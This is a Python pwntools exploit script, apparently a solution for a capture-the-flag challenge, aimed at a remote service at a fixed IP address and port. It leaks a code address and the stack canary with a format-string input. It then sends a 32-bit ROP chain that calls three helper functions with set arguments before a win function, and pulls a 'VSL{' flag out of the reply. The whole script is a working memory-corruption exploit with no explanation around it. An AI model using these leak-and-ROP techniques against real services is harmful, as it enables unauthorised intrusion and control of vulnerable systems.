#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'i386'
context.log_level = 'info'

p = remote('14.225.212.104', 9004)
p.recvuntil(b'My defense is too solid to be breached.\n')

# Leak
p.sendline(b'%3$08x|%15$08x')
output = p.recvuntil(b'Pow Pow Pow\n')
values = output.split(b'Pow')[0].strip().split(b'|')

code_leak = int(values[0], 16)
canary = int(values[1], 16)

base = code_leak - 0x1433
braum = base + 0x12cd
ornn = base + 0x12ea
thress = base + 0x1307
win = base + 0x1324
pop_ret = base + 0x1022

log.info(f"Base: 0x{base:08x}, Canary: 0x{canary:08x}")

# ROP chain
payload = b'A' * 32
payload += p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(braum)
payload += p32(pop_ret)
payload += p32(0x1337)
payload += p32(ornn)
payload += p32(pop_ret)
payload += p32(0x420)
payload += p32(thress)
payload += p32(pop_ret)
payload += p32(0xdeadbeef)
payload += p32(win)
payload += p32(0)
payload += p32(0x123)

log.info(f"Sending payload ({len(payload)} bytes)...")
p.send(payload)
p.send(b'\n')

# Wait and try to receive everything
import time
time.sleep(2)

log.info("Attempting to receive output...")
try:
    # Try different receiving methods
    data = b''
    p.settimeout(3)
    while True:
        try:
            chunk = p.recv(1024, timeout=1)
            if not chunk:
                break
            data += chunk
            log.info(f"Received {len(chunk)} bytes")
        except:
            break
    
    if data:
        log.success("="*50)
        log.success(f"RECEIVED DATA ({len(data)} bytes):")
        log.success("="*50)
        print(data)
        if b'VSL{' in data:
            log.success("FOUND FLAG!")
            # Extract flag
            flag_start = data.find(b'VSL{')
            flag_end = data.find(b'}', flag_start) + 1
            flag = data[flag_start:flag_end]
            log.success(f"FLAG: {flag.decode()}")
    else:
        log.warning("No data received")
except Exception as e:
    log.error(f"Error: {e}")

p.close()
